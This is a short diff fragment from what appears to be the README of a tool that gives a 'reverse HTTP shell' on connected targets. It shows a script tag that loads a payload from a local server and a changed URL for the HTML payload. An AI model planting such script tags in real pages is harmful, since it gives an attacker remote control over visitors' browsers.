@@ -52,7 +52,7 @@ When a the target is connected, it will spawn a reverse HTTP shell (type command
 Local target:
 
 <script src="http://localhost:6969/?command=get_script"></script>
-The HTML payload: http://localhost:6969/?command=get_html
+The HTML payload: http://localhost:6969/
 
 Remote target:
 
